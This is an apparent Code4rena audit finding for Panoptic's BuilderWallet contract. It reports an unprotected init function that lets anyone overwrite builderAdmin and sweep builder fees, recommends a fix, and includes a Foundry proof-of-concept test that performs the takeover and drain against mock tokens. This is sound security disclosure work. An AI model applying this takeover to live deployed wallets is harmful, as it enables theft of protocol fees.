  "body": "## Finding description and impact\n- Link: https://github.com/code-423n4/2025-12-panoptic/blob/main/contracts/RiskEngine.sol#L2319-L2321 (`sweep` uses `builderAdmin`)\n- Link: https://github.com/code-423n4/2025-12-panoptic/blob/main/contracts/CollateralTracker.sol#L1558-L1571 (builder fee transferred to `feeRecipient`)\n- Link: https://github.com/code-423n4/2025-12-panoptic/blob/main/contracts/CollateralTracker.sol#L1642-L1650 (builder fee on burn)\n\n`BuilderWallet.init` is publicly callable and lacks any access control or one‑time guard. This allows any EOA to set `builderAdmin` after deployment and call `sweep` to drain all accumulated builder fees. The wallet is a custody point for protocol‑generated fee flow, so the impact is direct theft of builder‑split revenue and loss of incentive alignment for builders/referrers.\nAny EOA can overwrite `builderAdmin` and sweep all builder fees from `BuilderWallet`, causing immediate loss of builder revenue.\n\n## Recommended mitigation steps\n\nRestrict `init` to the factory and enforce one‑time initialization (e.g., `onlyFactory` + `initializer` guard). Alternatively, set `builderAdmin` in the constructor and remove `init` entirely.",
  "proof_of_concept": "PoC shows any EOA can overwrite `builderAdmin` and sweep funds from a builder wallet via `init`/`sweep`. It deploys `BuilderFactory`, mints tokens into the wallet, then demonstrates takeover.\n\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\nimport {BuilderFactory, BuilderWallet} from \"@contracts/RiskEngine.sol\";\nimport {ERC20Minimal} from \"@tokens/ERC20Minimal.sol\";\n\ncontract MockERC20 is ERC20Minimal {\n    string public name = \"Mock Token\";\n    string public symbol = \"MOCK\";\n    uint8 public decimals = 18;\n\n    function mint(address to, uint256 amount) external {\n        _mint(to, amount);\n    }\n}\n\ncontract BuilderWalletInitPoC is Test {\n    function test_builderWalletInitCanBeOverwritten() public {\n        BuilderFactory factory = new BuilderFactory(address(this));\n        address legitAdmin = address(0xBEEF);\n        address attacker = address(0xBAD0);\n        uint48 builderCode = 123;\n\n        address walletAddr = factory.deployBuilder(builderCode, legitAdmin);\n        BuilderWallet wallet = BuilderWallet(walletAddr);\n\n        assertEq(wallet.builderAdmin(), legitAdmin);\n\n        MockERC20 token = new MockERC20();\n        token.mint(walletAddr, 100 ether);\n        assertEq(token.balanceOf(walletAddr), 100 ether);\n\n        vm.prank(attacker);\n        wallet.init(attacker);\n        assertEq(wallet.builderAdmin(), attacker);\n\n        vm.prank(attacker);\n        wallet.sweep(address(token), attacker);\n\n        assertEq(token.balanceOf(attacker), 100 ether);\n        assertEq(token.balanceOf(walletAddr), 0);\n    }\n}\n\n```",
